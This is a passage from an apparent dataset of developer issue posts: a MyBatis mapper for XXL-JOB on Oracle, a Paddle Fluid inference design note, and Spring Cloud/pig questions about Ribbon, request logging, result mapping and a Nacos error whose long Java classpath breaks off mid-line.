AND t.handle_code=0) &lt;/if&gt; &lt;/trim&gt; &lt;/select&gt; &lt;select id=""load"" parameterType=""java.lang.Integer"" resultMap=""XxlJobLog""&gt; SELECT &lt;include refid=""Base_Column_List"" /&gt; FROM XXL_JOB_QRTZ_TRIGGER_LOG t WHERE t.id = #{id} &lt;/select&gt; &lt;insert id=""save"" parameterType=""com.xxl.job.admin.core.model.XxlJobLog"" keyProperty=""id"" &gt; &lt;selectKey keyProperty=""id"" resultType=""int"" order=""BEFORE""&gt; select &lt;include refid=""JOB_KEY_SEQUENCE"" /&gt; from dual &lt;/selectKey&gt; INSERT INTO XXL_JOB_QRTZ_TRIGGER_LOG ( id, job_group, job_id ) VALUES ( #{id}, #{jobGroup}, #{jobId} ) &lt;!-- &lt;selectKey resultType=""java.lang.Integer"" order=""AFTER"" keyProperty=""id""&gt; SELECT LAST_INSERT_ID() &lt;/selectKey&gt; --&gt; &lt;/insert&gt; &lt;update id=""updateTriggerInfo""&gt; UPDATE XXL_JOB_QRTZ_TRIGGER_LOG SET glue_type= #{glueType}, trigger_time= #{triggerTime}, trigger_code= #{triggerCode}, trigger_msg= #{triggerMsg,jdbcType=VARCHAR}, executor_address= #{executorAddress,jdbcType=VARCHAR}, executor_handler=#{executorHandler,jdbcType=VARCHAR}, executor_param= #{executorParam,jdbcType=VARCHAR} WHERE id= #{id} &lt;/update&gt; &lt;update id=""updateHandleInfo""&gt; UPDATE XXL_JOB_QRTZ_TRIGGER_LOG SET handle_time= #{handleTime}, handle_code= #{handleCode}, handle_msg= #{handleMsg} WHERE id= #{id} &lt;/update&gt; &lt;delete id=""delete""&gt; delete from XXL_JOB_QRTZ_TRIGGER_LOG WHERE job_id = #{jobId} &lt;/delete&gt; &lt;select id=""triggerCountByHandleCode"" parameterType=""java.lang.Integer"" resultType=""java.lang.Integer""&gt; SELECT count(1) FROM XXL_JOB_QRTZ_TRIGGER_LOG t &lt;trim prefix=""WHERE"" prefixOverrides=""AND | OR"" &gt; &lt;if test=""_parameter gt 0""&gt; AND t.handle_code = #{handleCode} &lt;/if&gt; &lt;/trim&gt; &lt;/select&gt; &lt;select id=""triggerCountByDay"" parameterType=""java.util.Map"" resultType=""java.util.Map"" &gt; &lt;!-- SELECT DATE_FORMAT(trigger_time,'%Y-%m-%d') triggerDay, COUNT(id) triggerCount --&gt; SELECT TO_CHAR(trigger_time,'yyyy-mm-dd') triggerDay, COUNT(id) triggerCount FROM XXL_JOB_QRTZ_TRIGGER_LOG WHERE trigger_time BETWEEN #{from} and #{to} &lt;if test=""handleCode gt 0""&gt; AND handle_code = #{handleCode} &lt;/if&gt; GROUP BY TO_CHAR(trigger_time,'yyyy-mm-dd') &lt;/select&gt; &lt;delete id=""clearLog"" parameterType=""java.util.Map"" &gt; delete from XXL_JOB_QRTZ_TRIGGER_LOG &lt;trim prefix=""WHERE"" prefixOverrides=""AND | OR"" &gt; &lt;if test=""jobGroup gt 0""&gt; AND job_group = #{jobGroup} &lt;/if&gt; &lt;if test=""jobId gt 0""&gt; AND job_id = #{jobId} &lt;/if&gt; &lt;if test=""clearBeforeTime != null""&gt; AND trigger_time &lt;![CDATA[ &lt;= ]]&gt; #{clearBeforeTime} &lt;/if&gt; &lt;if test=""clearBeforeNum gt 0""&gt; AND id NOT in( SELECT id FROM( SELECT * FROM( SELECT id FROM XXL_JOB_QRTZ_TRIGGER_LOG t &lt;trim prefix=""WHERE"" prefixOverrides=""AND | OR"" &gt; &lt;if test=""jobGroup gt 0""&gt; AND t.job_group = #{jobGroup} &lt;/if&gt; &lt;if test=""jobId gt 0""&gt; AND t.job_id = #{jobId} &lt;/if&gt; &lt;/trim&gt; ORDER BY t.trigger_time desc ) WHERE ROWNUM BETWEEN 1 AND #{clearBeforeNum} &lt;!-- LIMIT 0, #{clearBeforeNum} --&gt; ) t1 ) &lt;/if&gt; &lt;/trim&gt; &lt;/delete&gt; &lt;/mapper&gt; &lt;?xml version=""1.0"" encoding=""UTF-8""?&gt; &lt;!DOCTYPE mapper PUBLIC ""-//mybatis.org//DTD Mapper 3.0//EN"" ""http://mybatis.org/dtd/mybatis-3-mapper.dtd""&gt; &lt;mapper namespace=""XxlJobRegistryMapper""&gt; &lt;resultMap id=""XxlJobRegistry"" type=""com.xxl.job.admin.core.model.XxlJobRegistry"" &gt; &lt;result column=""id"" property=""id"" /&gt; &lt;result column=""registry_group"" property=""registryGroup"" /&gt; &lt;result column=""registry_key"" property=""registryKey"" /&gt; &lt;result column=""registry_value"" property=""registryValue"" /&gt; &lt;result column=""update_time"" property=""updateTime"" /&gt; &lt;/resultMap&gt; &lt;sql id=""Base_Column_List""&gt; t.id, t.registry_group, t.registry_key, t.registry_value, t.update_time &lt;/sql&gt; &lt;sql id='JOB_KEY_SEQUENCE'&gt;JOB_KEY_SEQUENCE.NEXTVAL&lt;/sql&gt; &lt;delete id=""removeDead"" parameterType=""java.lang.Integer"" &gt; DELETE FROM XXL_JOB_QRTZ_TRIGGER_REGISTRY &lt;!-- WHERE update_time &lt;![CDATA[ &lt; ]]&gt; DATE_ADD(sysdate,INTERVAL -#{timeout} SECOND) --&gt; WHERE update_time &lt;![CDATA[ &lt; ]]&gt; sysdate+numtodsinterval(-#{timeout},'second') &lt;/delete&gt; &lt;select id=""findAll"" parameterType=""java.lang.Integer"" resultMap=""XxlJobRegistry""&gt; SELECT &lt;include refid=""Base_Column_List"" /&gt; FROM XXL_JOB_QRTZ_TRIGGER_REGISTRY t &lt;!-- WHERE t.update_time &lt;![CDATA[ &gt; ]]&gt; DATE_ADD(sysdate,INTERVAL -#{timeout} SECOND) --&gt; WHERE t.update_time &lt;![CDATA[ &gt; ]]&gt; sysdate+numtodsinterval(-#{timeout},'second') &lt;/select&gt; &lt;update id=""registryUpdate"" parameterType=""java.util.Map"" &gt; UPDATE XXL_JOB_QRTZ_TRIGGER_REGISTRY SET update_time = sysdate WHERE registry_group = #{registryGroup} AND registry_key = #{registryKey} AND registry_value = #{registryValue} &lt;/update&gt; &lt;insert id=""registrySave"" parameterType=""java.util.Map"" &gt; &lt;selectKey keyProperty=""id"" resultType=""int"" order=""BEFORE""&gt; select &lt;include refid=""JOB_KEY_SEQUENCE"" /&gt; from dual &lt;/selectKey&gt; INSERT INTO XXL_JOB_QRTZ_TRIGGER_REGISTRY(id, registry_group , registry_key , registry_value, update_time) VALUES(#{id}, #{registryGroup} , #{registryKey} , #{registryValue}, sysdate) &lt;/insert&gt; &lt;/mapper&gt;"
How to initialize a Fluid program?,"I think we need to address the problem below before merging startup program and main program into a single program: Init reader when doing inference An inference program will run repeatedly, but we may have a reader inside an inference program, it should be initialized only once, not every time when the inference program runs. Merging the startup program and the main program essentially runs the initialization operators on every run. Load parameters inside the Fluid program when doing inference. The V4 API proposal proposes to load parameters outside of the Fluid program: infer.py main.py It would be more coherent with the Fluid design if the parameter loading is inside the Fluid program: infer.py main.py   <code>: x = fluid.Tensor(name='x', shape=[13], dtype='float32') y_predict = fluid.layers.fc(name='y_predict', input=x, size=1, act=None) return y_predict program = fluid.compile('./infer.py', params='./params') inputs = { 'x': [2,4,64,36,7,4,3,2,4,6,5,9,8] } results = program.run(input=inputs) fluid.load_parameters(""./params.recordio"") x = fluid.Tensor(name='x', shape=[13], dtype='float32') y_predict = fluid.layers.fc(name='y_predict', input=x, size=1, act=None) return y_predict program = fluid.compile('./infer.py') program.init() inputs = { 'x': [2,4,64,36,7,4,3,2,4,6,5,9,8] } results = program.run(input=inputs)"
开源版3.0.3如何实现Ribbon的负载均衡,"环境信息 pigx版本: 3.0.3 是否修改包名: 否 查到的相关资料都是说通过@Bean的方式进行注入. 那么该如何注入? 在哪个地方注入? Nacos Gateway? 是否需要加入什么其他的注解? 目前尝试Nacos Gateway的加载类上都尝试过@Bean注入,但是都没有效果. 具体改在哪个地方注入,是否添加扫描之类的注解. 最好贴一个完整的启动类及注入方式.3Q   <code>: @Bean @Scope(value=""prototype"") public IRule loadBalanceRule(){ return new NacosRule(); }"
A list of optimization of mobilenet inference,"Currently, multiple products use Paddle to deploy the mobilenet model on mobile devices and hope that Paddle's inference performance can be further accelerated. Typical applications include image classification #2966:在v2的API下，如何运行分布式训练, image detection, and so on. So, here list some of the performance optimization related work to be done here. Benchmark of typical model Merge the batch normal calculation into the convolution. Optimize depthwise convolution First, optimizing the case of filter size is 3x3 and 4x4. Optimize pointwise convolution Mainly is sgemm computational performance problems. Which blas is the best in the mobile devices? OpenBlas, Eigen, or Other? In the ARMv7 environment, the matrix multiplication performance of Eigen is better than OpenBlas and in some ARMv8 environment the OpenBlas performance to be better. So we add a compilation option into Paddle, which can be used to choose to use Eigen or OpenBlas library.   <code>: USE_EIGEN_FOR_BLAS"
请求日志优化计划,目前的请求日志 打印成了一行那么问题来了，feign 的 okhttp 日志，应该穿梭在其中 反而到 请求日志之前打出来了， 这个需求得变成 Aop filter 之前之前打印请求的相关日志 aop filter 之后打印响应的日志 待办 调研 ServerCodecConfigurer enableLoggingRequestDetails 中的具体逻辑 和 servlet 中的相关功能   <code>: 打印成了一行
联合查询下，如何映射并返回单列的集合,"例如，目前有两个表，分别是 user 和 user_role 表，字段分别为 我想实现一个功能：查询每个用户的所有角色名(role_name)， 每个用户对应的角色至少一个。 请问这种需要如何实现？ （ 可以使用 JsonMapper, 但如何定义 json 使得可以将查询到的 role_name 映射为 roleNames 当中 ）   <code>: user: id, user_name user_role: id, user_id, role_name public class UserVo{ private String userName; private List&lt;String&gt; roleNames; }"
nacos 2.0  | 服务注册停止后 提示报错 Request nacos server failed,"pig版本: 3.1.0 是否修改包名: 否   <code>: /Users/lengleng/env/java/graalvm-ce-java11-21.0.0.2/Contents/Home/bin/java -agentlib:jdwp=transport=dt_socket,address=127.0.0.1:56814,suspend=y,server=n -XX:TieredStopAtLevel=1 -noverify -Dspring.output.ansi.enabled=always -javaagent:/Users/lengleng/Library/Caches/JetBrains/IntelliJIdea2021.1/captureAgent/debugger-agent.jar -Dcom.sun.management.jmxremote -Dspring.jmx.enabled=true -Dspring.liveBeansView.mbeanDomain -Dspring.application.admin.enabled=true -Dfile.encoding=UTF-8 -classpath /Users/lengleng/work/open/pig/pig-upms/pig-upms-biz/target/classes:/Users/lengleng/work/open/pig/pig-upms/pig-upms-api/target/classes:/Users/lengleng/work/open/pig/pig-common/pig-common-core/target/classes:/Users/lengleng/env/repository/cn/hutool/hutool-all/5.6.2/hutool-all-5.6.2.jar:/Users/lengleng/env/repository/org/springframework/boot/spring-boot-starter-data-redis/2.4.4/spring-boot-starter-data-redis-2.4.4.jar:/Users/lengleng/env/repository/org/springframework/data/spring-data-redis/2.4.6/spring-data-redis-2.4.6.jar:/Users/lengleng/env/repository/org/springframework/data/spring-data-keyvalue/2.4.6/spring-data-keyvalue-2.4.6.jar:/Users/lengleng/env/repository/org/springframework/data/spring-data-commons/2.4.6/spring-data-commons-2.4.6.jar:/Users/lengleng/env/repository/org/springframework/spring-tx/5.3.5/spring-tx-5.3.5.jar:/Users/lengleng/env/repository/org/springframework/spring-oxm/5.3.5/spring-oxm-5.3.5.jar:/Users/lengleng/env/repository/org/springframework/spring-context-support/5.3.5/spring-context-support-5.3.5.jar:/Users/lengleng/env/repository/io/lettuce/lettuce-core/6.0.3.RELEASE/lettuce-core-6.0.3.RELEASE.jar:/Users/lengleng/env/repository/io/netty/netty-common/4.1.60.Final/netty-common-4.1.60.Final.jar:/Users/lengleng/env/repository/io/netty/netty-handler/4.1.60.Final/netty-handler-4.1.60.Final.jar:/Users/lengleng/env/repository/io/netty/netty-resolver/4.1.60.Final/netty-resolver-4.1.60.Final.jar:/Users/lengleng/env/repository/io/netty/netty-buffer/4.1.60.Final/netty-buffer-4.1.60.Final.jar:/Users/lengleng/env/repository/io/netty/netty-codec/4.1.60.Final/netty-codec-4.1.60.Final.jar:/Users/lengleng/env/repository/io/netty/netty-transport/4.1.60.Final/netty-transport-4.1.60.Final.jar:/Users/lengleng/env/repository/io/projectreactor/reactor-core/3.4.4/reactor-core-3.4.4.jar:/Users/lengleng/env/repository/org/reactivestreams/reactive-streams/1.0.3/reactive-streams-1.0.3.jar:/Users/lengleng/env/repository/javax/servlet/javax.servlet-api/4.0.1/javax.servlet-api-4.0.1.jar:/Users/lengleng/env/repository/com/baomidou/mybatis-plus-extension/3.4.2/mybatis-plus-extension-3.4.2.jar:/Users/lengleng/env/repository/com/baomidou/mybatis-plus-core/3.4.2/mybatis-plus-core-3.4.2.jar:/Users/lengleng/env/repository/com/baomidou/mybatis-plus-annotation/3.4.2/mybatis-plus-annotation-3.4.2.jar:/Users/lengleng/env/repository/com/github/jsqlparser/jsqlparser/4.0/jsqlparser-4.0.jar:/Users/lengleng/env/repository/org/mybatis/mybatis/3.5.6/mybatis-3.5.6.jar:/Users/lengleng/env/repository/org/mybatis/mybatis-spring/2.0.5/mybatis-spring-2.0.5.jar:/Users/lengleng/env/repository/org/springframework/boot/spring-boot-starter-validation/2.4.4/spring-boot-starter-validation-2.4.4.jar:/Users/lengleng/env/repository/org/hibernate/validator/hibernate-validator/6.1.7.Final/hibernate-validator-6.1.7.Final.jar:/Users/lengleng/env/repository/jakarta/validation/jakarta.validation-api/2.0.2/jakarta.validation-api-2.0.2.jar:/Users/lengleng/env/repository/org/springframework/boot/spring-boot-starter-json/2.4.4/spring-boot-starter-json-2.4.4.jar:/Users/lengleng/env/repository/com/fasterxml/jackson/datatype/jackson-datatype-jdk8/2.11.4/jackson-datatype-jdk8-2.11.4.jar:/Users/lengleng/env/repository/com/fasterxml/jackson/module/jackson-module-parameter-names/2.11.4/jackson-module-parameter-names-2.11.4.jar:/Users/lengleng/env/repository/io/swagger/swagger-annotations/1.5.24/swagger-annotations-1.5.24.jar:/Users/lengleng/env/repository/org/springframework/cloud/spring-cloud-starter-openfeign/3.0.2/spring-cloud-starter-openfeign-3.0.2.jar:/Users/lengleng/env/repository/org/springframework/cloud/spring-cloud-openfeign-core/3.0.2/spring-cloud-openfeign-core-3.0.2.jar:/Users/lengleng/env/repository/org/springframework/boot/spring-boot-starter-aop/2.4.4/spring-boot-starter-aop-2.4.4.jar:/Users/lengleng/env/repository/org/aspectj/aspectjweaver/1.9.6/aspectjweaver-1.9.6.jar:/Users/lengleng/env/repository/io/github/openfeign/form/feign-form-spring/3.8.0/feign-form-spring-3.8.0.jar:/Users/lengleng/env/repository/io/github/openfeign/form/feign-form/3.8.0/feign-form-3.8.0.jar:/Users/lengleng/env/repository/commons-fileupload/commons-fileupload/1.4/commons-fileupload-1.4.jar:/Users/lengleng/env/repository/commons-io/commons-io/2.2/commons-io-2.2.jar:/Users/lengleng/env/repository/org/springframework/spring-web/5.3.5/spring-web-5.3.5.jar:/Users/lengleng/env/repository/io/github/openfeign/feign-core/10.10.1/feign-core-10.10.1.jar:/Users/lengleng/env/repository/io/github/openfeign/feign-slf4j/10.10.1/feign-slf4j-10.10.1.jar:/Users/lengleng/work/open/pig/pig-common/pig-common-feign/target/classes:/Users/lengleng/env/repository/com/alibaba/cloud/spring-cloud-starter-alibaba-sentinel/2021.1/spring-cloud-starter-alibaba-sentinel-2021.1.jar:/Users/lengleng/env/repository/com/alibaba/csp/sentinel-transport-simple-http/1.8.0/sentinel-transport-simple-http-1.8.0.jar:/Users/lengleng/env/repository/com/alibaba/csp/sentinel-transport-common/1.8.0/sentinel-transport-common-1.8.0.jar:/Users/lengleng/env/repository/com/alibaba/csp/sentinel-datasource-extension/1.8.0/sentinel-datasource-extension-1.8.0.jar:/Users/lengleng/env/repository/com/alibaba/fastjson/1.2.75/fastjson-1.2.75.jar:/Users/lengleng/env/repository/com/alibaba/csp/sentinel-annotation-aspectj/1.8.0/sentinel-annotation-aspectj-1.8.0.jar:/Users/lengleng/env/repository/com/alibaba/csp/sentinel-core/1.8.0/sentinel-core-1.8.0.jar:/Users/lengleng/env/repository/org/aspectj/aspectjrt/1.9.6/aspectjrt-1.9.6.jar:/Users/lengleng/env/repository/com/alibaba/cloud/spring-cloud-circuitbreaker-sentinel/2021.1/spring-cloud-circuitbreaker-sentinel-2021.1.jar:/Users/lengleng/env/repository/com/alibaba/csp/sentinel-reactor-adapter/1.8.0/sentinel-reactor-adapter-1.8.0.jar:/Users/lengleng/env/repository/com/alibaba/csp/sentinel-spring-webflux-adapter/1.8.0/sentinel-spring-webflux-adapter-1.8.0.jar:/Users/lengleng/env/repository/com/alibaba/csp/sentinel-spring-webmvc-adapter/1.8.0/sentinel-spring-webmvc-adapter-1.8.0.jar:/Users/lengleng/env/repository/com/alibaba/csp/sentinel-parameter-flow-control/1.8.0/sentinel-parameter-flow-control-1.8.0.jar:/Users/lengleng/env/repository/com/googlecode/concurrentlinkedhashmap/concurrentlinkedhashmap-lru/1.4.2/concurrentlinkedhashmap-lru-1.4.2.jar:/Users/lengleng/env/repository/com/alibaba/csp/sentinel-cluster-server-default/1.8.0/sentinel-cluster-server-default-1.8.0.jar:/Users/lengleng/env/repository/com/alibaba/csp/sentinel-cluster-common-default/1.8.0/sentinel-cluster-common-default-1.8.0.jar:/Users/lengleng/env/repository/com/alibaba/csp/sentinel-cluster-client-default/1.8.0/sentinel-cluster-client-default-1.8.0.jar:/Users/lengleng/env/repository/com/alibaba/cloud/spring-cloud-alibaba-sentinel-datasource/2021.1/spring-cloud-alibaba-sentinel-datasource-2021.1.jar:/Users/lengleng/env/repository/io/github/openfeign/feign-okhttp/10.10.1/feign-okhttp-10.10.1.jar:/Users/lengleng/env/repository/com/squareup/okhttp3/okhttp/3.14.9/okhttp-3.14.9.jar:/Users/lengleng/env/repository/com/squareup/okio/okio/1.17.2/okio-1.17.2.jar:/Users/lengleng/env/repository/org/springframework/cloud/spring-cloud-starter-loadbalancer/3.0.2/spring-cloud-starter-loadbalancer-3.0.2.jar:/Users/lengleng/env/repository/org/springframework/cloud/spring-cloud-loadbalancer/3.0.2/spring-cloud-loadbalancer-3.0.2.jar:/Users/lengleng/env/repository/io/projectreactor/addons/reactor-extra/3.4.2/reactor-extra-3.4.2.jar:/Users/lengleng/env/repository/org/springframework/boot/spring-boot-starter-cache/2.4.4/spring-boot-starter-cache-2.4.4.jar:/Users/lengleng/env/repository/com/stoyanr/evictor/1.0.0/evictor-1.0.0.jar:/Users/lengleng/work/open/pig/pig-common/pig-common-security/target/classes:/Users/lengleng/env/repository/org/springframework/security/oauth/boot/spring-security-oauth2-autoconfigure/2.1.2.RELEASE/spring-security-oauth2-autoconfigure-2.1.2.RELEASE.jar:/Users/lengleng/env/repository/com/fasterxml/jackson/core/jackson-annotations/2.11.4/jackson-annotations-2.11.4.jar:/Users/lengleng/env/repository/com/fasterxml/jackson/core/jackson-databind/2.11.4/jackson-databind-2.11.4.jar:/Users/lengleng/env/repository/com/sun/xml/bind/jaxb-core/2.3.0.1/jaxb-core-2.3.0.1.jar:/Users/lengleng/env/repository/com/sun/xml/bind/jaxb-impl/2.3.0.1/jaxb-impl-2.3.0.1.jar:/Users/lengleng/env/repository/javax/xml/bind/jaxb-api/2.3.1/jaxb-api-2.3.1.jar:/Users/lengleng/env/repository/javax/activation/javax.activation-api/1.2.0/javax.activation-api-1.2.0.jar:/Users/lengleng/env/repository/org/springframework/boot/spring-boot/2.4.4/spring-boot-2.4.4.jar:/Users/lengleng/env/repository/org/springframework/boot/spring-boot-autoconfigure/2.4.4/spring-boot-autoconfigure-2.4.4.jar:/Users/lengleng/env/repository/org/springframework/security/spring-security-jwt/1.0.9.RELEASE/spring-security-jwt-1.0.9.RELEASE.jar:/Users/lengleng/env/repository/org/bouncycastle/bcpkix-jdk15on/1.56/bcpkix-jdk15on-1.56.jar:/Users/lengleng/env/repository/org/bouncycastle/bcprov-jdk15on/1.56/bcprov-jdk15on-1.56.jar:/Users/lengleng/work/open/pig/pig-common/pig-common-log/target/classes:/Users/lengleng/env/repository/org/springframework/security/spring-security-core/5.4.5/spring-security-core-5.4.5.jar:/Users/lengleng/env/repository/org/springframework/spring-aop/5.3.5/spring-aop-5.3.5.jar:/Users/lengleng/env/repository/org/springframework/spring-beans/5.3.5/spring-beans-5.3.5.jar:/Users/lengleng/env/repository/org/springframework/spring-context/5.3.5/spring-context-5.3.5.jar:/Users/lengleng/env/repository/org/springframework/spring-expression/5.3.5/spring-expression-5.3.5.jar:/Users/lengleng/env/repository/org/springframework/security/oauth/spring-security-oauth2/2.3.6.RELEASE/spring-security-oauth2-2.3.6.RELEASE.jar:/Users/lengleng/env/repository/org/springframework/security/spring-security-config/5.4.5/spring-security-config-5.4.5.jar:/Users/lengleng/env/repository/org/springframework/security/spring-security-web/5.4.5/spring-security-web-5.4.5.jar:/Users/lengleng/env/repository/commons-codec/commons-codec/1.15/commons-codec-1.15.jar:/Users/lengleng/env/repository/org/codehaus/jackson/jackson-mapper-asl/1.9.13/jackson-mapper-asl-1.9.13.jar:/Users/lengleng/env/repository/org/codehaus/jackson/jackson-core-asl/1.9.13/jackson-core-asl-1.9.13.jar:/Users/lengleng/work/open/pig/pig-common/pig-common-swagger/target/classes:/Users/lengleng/env/repository/io/springfox/springfox-swagger-ui/3.0.0/springfox-swagger-ui-3.0.0.jar:/Users/lengleng/env/repository/io/springfox/springfox-spring-webmvc/3.0.0/springfox-spring-webmvc-3.0.0.jar:/Users/lengleng/env/repository/io/springfox/springfox-swagger2/3.0.0/springfox-swagger2-3.0.0.jar:/Users/lengleng/env/repository/io/springfox/springfox-spi/3.0.0/springfox-spi-3.0.0.jar:/Users/lengleng/env/repository/io/springfox/springfox-schema/3.0.0/springfox-schema-3.0.0.jar:/Users/lengleng/env/repository/io/springfox/springfox-swagger-common/3.0.0/springfox-swagger-common-3.0.0.jar:/Users/lengleng/env/repository/io/springfox/springfox-spring-web/3.0.0/springfox-spring-web-3.0.0.jar:/Users/lengleng/env/repository/io/github/classgraph/classgraph/4.8.83/classgraph-4.8.83.jar:/Users/lengleng/env/repository/io/springfox/springfox-spring-webflux/3.0.0/springfox-spring-webflux-3.0.0.jar:/Users/lengleng/env/repository/com/fasterxml/classmate/1.5.1/classmate-1.5.1.jar:/Users/lengleng/env/repository/org/slf4j/slf4j-api/1.7.30/slf4j-api-1.7.30.jar:/Users/lengleng/env/repository/org/springframework/plugin/spring-plugin-core/2.0.0.RELEASE/spring-plugin-core-2.0.0.RELEASE.jar:/Users/lengleng/env/repository/org/springframework/plugin/spring-plugin-metadata/2.0.0.RELEASE/spring-plugin-metadata-2.0.0.RELEASE.jar:/Users/lengleng/env/repository/io/swagger/swagger-models/1.5.24/swagger-models-1.5.24.jar:/Users/lengleng/env/repository/org/mapstruct/mapstruct/1.3.1.Final/mapstruct-1.3.1.Final.jar:/Users/lengleng/env/repository/io/springfox/springfox-oas/3.0.0/springfox-oas-3.0.0.jar:/Users/lengleng/env/repository/io/swagger/core/v3/swagger-annotations/2.1.2/swagger-annotations-2.1.2.jar:/Users/lengleng/env/repository/io/swagger/core/v3/swagger-models/2.1.2/swagger-models-2.1.2.jar:/Users/lengleng/env/repository/io/springfox/springfox-core/3.0.0/springfox-core-3.0.0.jar:/Users/lengleng/work/open/pig/pig-common/pig-common-mybatis/target/classes:/Users/lengleng/env/repository/cn/hutool/hutool-core/5.6.2/hutool-core-5.6.2.jar:/Users/lengleng/env/repository/com/baomidou/mybatis-plus-boot-starter/3.4.2/mybatis-plus-boot-starter-3.4.2.jar:/Users/lengleng/env/repository/com/baomidou/mybatis-plus/3.4.2/mybatis-plus-3.4.2.jar:/Users/lengleng/env/repository/org/springframework/boot/spring-boot-starter-jdbc/2.4.4/spring-boot-starter-jdbc-2.4.4.jar:/Users/lengleng/env/repository/com/zaxxer/HikariCP/3.4.5/HikariCP-3.4.5.jar:/Users/lengleng/env/repository/org/springframework/spring-jdbc/5.3.5/spring-jdbc-5.3.5.jar:/Users/lengleng/env/repository/mysql/mysql-connector-java/8.0.23/mysql-connector-java-8.0.23.jar:/Users/lengleng/env/repository/org/springframework/spring-webmvc/5.3.5/spring-webmvc-5.3.5.jar:/Users/lengleng/env/repository/com/alibaba/cloud/spring-cloud-starter-alibaba-nacos-discovery/2021.1/spring-cloud-starter-alibaba-nacos-discovery-2021.1.jar:/Users/lengleng/env/repository/com/alibaba/cloud/spring-cloud-alibaba-commons/2021.1/spring-cloud-alibaba-commons-2021.1.jar:/Users/lengleng/env/repository/com/alibaba/nacos/nacos-client/2.0.0/nacos-client-2.0.0.jar:/Users/lengleng/env/repository/com/fasterxml/jackson/core/jackson-core/2.11.4/jackson-core-2.11.4.jar:/Users/lengleng/env/repository/org/apache/httpcomponents/httpasyncclient/4.1.4/httpasyncclient-4.1.4.jar:/Users/lengleng/env/repository/org/apache/httpcomponents/httpcore/4.4.14/httpcore-4.4.14.jar:/Users/lengleng/env/repository/org/apache/httpcomponents/httpcore-nio/4.4.14/httpcore-nio-4.4.14.jar:/Users/lengleng/env/repository/org/apache/httpcomponents/httpclient/4.5.13/httpclient-4.5.13.jar:/Users/lengleng/env/repository/org/reflections/reflections/0.9.11/reflections-0.9.11.jar:/Users/lengleng/env/repository/com/google/guava/guava/20.0/guava-20.0.jar:/Users/lengleng/env/repository/org/javassist/javassist/3.21.0-GA/javassist-3.21.0-GA.jar:/Users/lengleng/env/repository/io/prometheus/simpleclient/0.5.0/simpleclient-0.5.0.jar:/Users/lengleng/env/repository/org/yaml/snakeyaml/1.27/snakeyaml-1.27.jar:/Users/lengleng/env/repository/com/alibaba/spring/spring-context-support/1.0.10/spring-context-support-1.0.10.jar:/Users/lengleng/env/repository/org/springframework/cloud/spring-cloud-commons/3.0.2/spring-cloud-commons-3.0.2.jar:/Users/lengleng/env/repository/org/springframework/security/spring-security-crypto/5.4.5/spring-security-crypto-5.4.5.jar:/Users/lengleng/env/repository/org/springframework/cloud/spring-cloud-context/3.0.2/spring-cloud-context-3.0.2.jar:/Users/lengleng/env/repository/com/alibaba/cloud/spring-cloud-starter-alibaba-nacos-config/2021.1/spring-cloud-starter-alibaba-nacos-config-2021.1.jar:/Users/lengleng/env/repository/org/springframework/boot/spring-boot-starter-undertow/2.4.4/spring-boot-starter-undertow-2.4.4.jar:/Users/lengleng/env/repository/io/undertow/undertow-core/2.2.5.Final/undertow-core-2.2.5.Final.jar:/Users/lengleng/env/repository/org/jboss/logging/jboss-logging/3.4.1.Final/jboss-logging-3.4.1.Final.jar:/Users/lengleng/env/repository/org/jboss/xnio/xnio-api/3.8.0.Final/xnio-api-3.8.0.Final.jar:/Users/lengleng/env/repository/org/wildfly/common/wildfly-common/1.5.2.Final/wildfly-common-1.5.2.Final.jar:/Users/lengleng/env/repository/org/wildfly/client/wildfly-client-config/1.0.1.Final/wildfly-client-config-1.0.1.Final.jar:/Users/lengleng/env/repository/org/jboss/xnio/xnio-nio/3.8.0.Final/xnio-nio-3.8.0.Final.jar:/Users/lengleng/env/repository/org/jboss/threads/jboss-threads/3.1.0.Final/jboss-threads-3.1.0.Final.jar:/Users/lengleng/env/repository/io/undertow/undertow-servlet/2.2.5.Final/undertow-servlet-2.2.5.Final.jar:/Users/lengleng/env/repository/org/jboss/spec/javax/annotation/jboss-annotations-api_1.3_spec/2.0.1.Final/jboss-annotations-api_1.3_spec-2.0.1.Final.jar:/Users/lengleng/env/repository/io/undertow/undertow-websockets-jsr/2.2.5.Final/undertow-websockets-jsr-2.2.5.Final.jar:/Users/lengleng/env/repository/org/jboss/spec/javax/websocket/jboss-websocket-api_1.1_spec/2.0.0.Final/jboss-websocket-api_1.1_spec-2.0.0.Final.jar:/Users/lengleng/env/repository/jakarta/servlet/jakarta.servlet-api/4.0.4/jakarta.servlet-api-4.0.4.jar:/Users/lengleng/env/repository/org/glassfish/jakarta.el/3.0.3/jakarta.el-3.0.3.jar:/Users/lengleng/env/repository/org/springframework/cloud/spring-cloud-starter-bootstrap/3.0.2/spring-cloud-starter-bootstrap-3.0.2.jar:/Users/lengleng/env/repository/org/springframework/cloud/spring-cloud-starter/3.0.2/spring-cloud-starter-3.0.2.jar:/Users/lengleng/env/repository/org/springframework/security/spring-security-rsa/1.0.9.RELEASE/spring-security-rsa-1.0.9.RELEASE.jar:/Users/lengleng/env/repository/org/springframework/boot/spring-boot-configuration-processor/2.4.4/spring-boot-configuration-processor-2.4.4.jar:/Users/lengleng/env/repository/com/github/ulisesbocchio/jasypt-spring-boot-starter/2.1.0/jasypt-spring-boot-starter-2.1.0.jar:/Users/lengleng/env/repository/com/github/ulisesbocchio/jasypt-spring-boot/2.1.0/jasypt-spring-boot-2.1.0.jar:/Users/lengleng/env/repository/org/jasypt/jasypt/1.9.2/jasypt-1.9.2.jar:/Users/lengleng/env/repository/org/springframework/boot/spring-boot-starter-actuator/2.4.4/spring-boot-starter-actuator-2.4.4.jar:/Users/lengleng/env/repository/org/springframework/boot/spring-boot-starter/2.4.4/spring-boot-starter-2.4.4.jar:/Users/lengleng/env/repository/org/springframework/boot/spring-boot-starter-logging/2.4.4/spring-boot-starter-logging-2.4.4.jar:/Users/lengleng/env/repository/ch/qos/logback/logback-classic/1.2.3/logback-classic-1.2.3.jar:/Users/lengleng/env/repository/ch/qos/logback/logback-core/1.2.3/logback-core-1.2.3.jar:/Users/lengleng/env/repository/org/apache/logging/log4j/log4j-to-slf4j/2.13.3/log4j-to-slf4j-2.13.3.jar:/Users/lengleng/env/repository/org/apache/logging/log4j/log4j-api/2.13.3/log4j-api-2.13.3.jar:/Users/lengleng/env/repository/org/slf4j/jul-to-slf4j/1.7.30/jul-to-slf4j-1.7.30.jar:/Users/lengleng/env/repository/jakarta/annotation/jakarta.annotation-api/1.3.5/jakarta.annotation-api-1.3.5.jar:/Users/lengleng/env/repository/org/springframework/boot/spring-boot-actuator-autoconfigure/2.4.4/spring-boot-actuator-autoconfigure-2.4.4.jar:/Users/lengleng/env/repository/org/springframework/b